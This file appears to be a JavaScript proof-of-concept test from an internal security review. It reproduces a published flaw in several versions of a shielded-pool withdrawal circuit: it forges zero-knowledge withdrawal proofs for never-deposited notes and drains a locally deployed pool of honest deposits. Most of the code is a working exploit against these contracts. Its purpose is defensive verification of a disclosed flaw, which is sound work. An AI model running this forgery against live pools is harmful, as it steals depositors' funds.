'use strict';
/*
 * P1.1 — the published flaw (THREAT-MODEL §8.0) reproduced on every pre-V7 circuit with its OWN committed files:
 *   withdraw_v2, withdraw_v3, withdraw_v4: witness from the committed wasm, proof with the committed final zkey,
 *   accepted by the committed verification key (v3/v4: also by the committed Solidity verifier on a local EVM, and a
 *   pool with honest deposits is emptied by an account that never deposited: V5Native on withdraw_v3, V6Native on v4).
 *   withdraw (v1): no proving key was ever published (its verifier contracts/Verifier.sol came from a browser setup,
 *   tools/zk-toolkit.html), so the forgery is shown at the constraint level and with a throw-away key (needs $CIRCOM).
 * Local only. Internal review, not an audit.
 */
const fs = require('fs');
const path = require('path');
const L = require('./lib');
const { snarkjs, H, rnd, CIRCUITS, files, note, tree, forgePath, inputFor, witness, proveWtns, verify, vkeyOf, recorder } = L;
const evm = require('./evm');
const circom = require('./circom');

async function forgeOffchain(name, wasm, zkey, vkey, t, extra) {
  const c = CIRCUITS[name];
  // A pool with three honest deposits by other people.
  const honest = [note(c.secret), note(c.secret), note(c.secret)];
  const tr = tree(c.levels, honest.map((n) => n.commitment));
  const Lc = tr.layers[c.levels - 1][0], Rc = tr.layers[c.levels - 1][1] ?? tr.z[c.levels - 1];
  // The attacker's note was never deposited.
  const atk = note(c.secret);
  const fp = forgePath(c.levels, atk.commitment, Lc, Rc);
  const inp = inputFor(name, atk, tr.root, fp, extra);
  const wt = await witness(wasm, inp);
  const { proof, publicSignals } = await proveWtns(zkey, wt);
  const ok = await verify(vkey, publicSignals, proof);
  return { ok, proof, publicSignals, wt, inp, atk, tr, fp, notInTree: !tr.layers[0].includes(atk.commitment) };
}

async function poolDrain(t, name, poolFile, poolName, verifierFile, verifierName) {
  const c = CIRCUITS[name]; const f = files(name); const vkey = await vkeyOf(name);
  const out = evm.compile({ 'contracts/Pool.sol': path.join(L.ROOT, 'contracts', poolFile), 'contracts/PoseidonT3.sol': path.join(L.ROOT, 'contracts', 'PoseidonT3.sol'),
    'contracts/Verifier.sol': path.join(L.ROOT, 'contracts', verifierFile) });
  const ch = await evm.chain();
  try {
    const [dep, alice, bob, carol, attacker] = ch.signers;
    const lib = await ch.deploy(out.contracts['contracts/PoseidonT3.sol'].PoseidonT3);
    const ver = await ch.deploy(out.contracts['contracts/Verifier.sol'][verifierName]);
    const D = 10n ** 18n;
    const pool = await ch.deploy(out.contracts['contracts/Pool.sol'][poolName], [await ver.getAddress(), D], { PoseidonT3: await lib.getAddress() });
    for (const s of [alice, bob, carol]) await (await pool.connect(s).deposit(note('split').commitment, { value: D })).wait();
    const poolAddr = await pool.getAddress();
    const before = await ch.provider.getBalance(poolAddr);
    const recipient = evm.ethers.Wallet.createRandom().address;
    let n = 0;
    for (let k = 0; k < 3; k++) {
      // Everything the attacker needs is public: current root, filledSubtrees[L-1], zeros[L-1].
      const root = await pool.roots(await pool.currentRootIndex());
      const Lc = await pool.filledSubtrees(c.levels - 1), Rc = await pool.zeros(c.levels - 1);
      if (H(Lc, Rc) !== root) throw new Error('root is not H(filledSubtrees[L-1], zeros[L-1])');
      const atk = note('split');
      const fp = forgePath(c.levels, atk.commitment, Lc, Rc);
      const inp = inputFor(name, atk, root, fp, { recipient: BigInt(recipient) });
      const { proof, publicSignals } = await proveWtns(f.zkey, await witness(f.wasm, inp));
      if ((await verify(vkey, publicSignals, proof)) !== true) break;
      const s = evm.sol(proof);
      const args = c.pub.length === 3 ? [s.a, s.b, s.c, root, atk.nullifierHash, recipient] : [s.a, s.b, s.c, root, atk.nullifierHash, recipient, evm.ethers.ZeroAddress, 0];
      await (await pool.connect(attacker).withdraw(...args, { gasLimit: 3_000_000 })).wait();
      n++;
    }
    const after = await ch.provider.getBalance(poolAddr);
    t.rec(`${name}: ${poolName} with 3 honest deposits is emptied by an account with no deposit (local EVM)`,
      n === 3 && before === 3n * D && after === 0n && (await ch.provider.getBalance(recipient)) === 3n * D, `${n} forged withdrawals, pool ${before / D} -> ${after / D}`);
  } finally { ch.close(); }
}

async function main() {
  const t = recorder('P1.1 forgery on the pre-V7 circuits (published flaw §8.0)');
  for (const name of ['withdraw_v2', 'withdraw_v3', 'withdraw_v4']) {
    const f = files(name); const vkey = await vkeyOf(name);
    const r = await forgeOffchain(name, f.wasm, f.zkey, vkey, t, { recipient: 0xdeadn, relayer: 0xbeefn, fee: 7n });
    t.rec(`${name}: forged proof (commitment never deposited, top selector non-binary) passes the committed key`, r.ok === true && r.notInTree,
      'selector s = ' + r.fp.topSelector.toString().slice(0, 12) + '…');
    if (circom.available()) {
      const b = circom.build(name);
      // The witness is recomputed with the freshly built wasm: the committed withdraw_v2 wasm was built with other
      // circom/circomlib versions and has a different wire layout (see p1-artifacts.js).
      const okR1cs = await snarkjs.wtns.check(b.r1cs, await witness(b.wasm, r.inp), { info() {}, warn() {}, error() {}, debug() {} });
      t.rec(`${name}: the same forged input satisfies the r1cs built from circuits/${name}.circom`, okR1cs === true);
    } else t.skip(`${name}: r1cs check of the forged witness`, 'set CIRCOM to a circom 2.2.3 binary');
  }

  // Solidity verifiers committed for v3/v4 accept the forged proofs too.
  for (const [name, file, cname] of [['withdraw_v3', 'WithdrawVerifierV3.sol', 'Groth16Verifier'], ['withdraw_v4', 'WithdrawVerifierV4.sol', 'WithdrawVerifierV4']]) {
    const f = files(name); const vkey = await vkeyOf(name);
    const r = await forgeOffchain(name, f.wasm, f.zkey, vkey, t, { recipient: 0xdeadn, relayer: 0xbeefn, fee: 7n });
    const out = evm.compile({ 'contracts/V.sol': path.join(L.ROOT, 'contracts', file) });
    const ch = await evm.chain();
    try {
      const v = await ch.deploy(out.contracts['contracts/V.sol'][cname]); const s = evm.sol(r.proof);
      t.rec(`${name}: contracts/${file} accepts the forged proof (local EVM)`, (await v.verifyProof(s.a, s.b, s.c, r.publicSignals)) === true);
    } finally { ch.close(); }
  }
  await poolDrain(t, 'withdraw_v3', 'LatheonShieldedPoolV5Native.sol', 'LatheonShieldedPoolV5Native', 'WithdrawVerifierV3.sol', 'Groth16Verifier');
  await poolDrain(t, 'withdraw_v4', 'LatheonShieldedPoolV6Native.sol', 'LatheonShieldedPoolV6Native', 'WithdrawVerifierV4.sol', 'WithdrawVerifierV4');

  // withdraw (v1): no committed wasm/zkey. Constraint-level forgery + throw-away key.
  if (circom.available()) {
    const b = circom.build('withdraw');
    const r1 = { wasm: b.wasm };
    const ptau = { type: 'mem' }, ptau2 = { type: 'mem' }, zk = { type: 'mem' };
    const curve = await snarkjs.curves.getCurveFromName('bn128');
    const quiet = { info() {}, warn() {}, error() {}, debug() {} };
    // INSECURE throw-away setup (no contribution): only to show the statement is forgeable; not the deployed key.
    await snarkjs.powersOfTau.newAccumulator(curve, 13, ptau, quiet);
    await snarkjs.powersOfTau.preparePhase2(ptau, ptau2, quiet);
    await snarkjs.zKey.newZKey(b.r1cs, ptau2, zk, quiet);
    const vk = await snarkjs.zKey.exportVerificationKey(zk, quiet);
    const r = await forgeOffchain('withdraw', r1.wasm, zk, vk, t, {});
    const okR1cs = await snarkjs.wtns.check(b.r1cs, r.wt, quiet);
    t.rec('withdraw (v1): forged witness satisfies the r1cs of circuits/withdraw.circom', okR1cs === true && r.notInTree);
    t.rec('withdraw (v1): forged proof verifies under a throw-away key for the same r1cs (deployed key never published)', r.ok === true);
  } else {
    t.skip('withdraw (v1): forgery', 'no proving key in the repository; set CIRCOM to compile circuits/withdraw.circom');
  }
  const fails = t.done();
  process.exitCode = fails ? 1 : 0;
  return fails;
}
if (require.main === module) main().catch((e) => { console.error(e); process.exit(1); }).then(() => process.exit(process.exitCode || 0));
module.exports = { main };
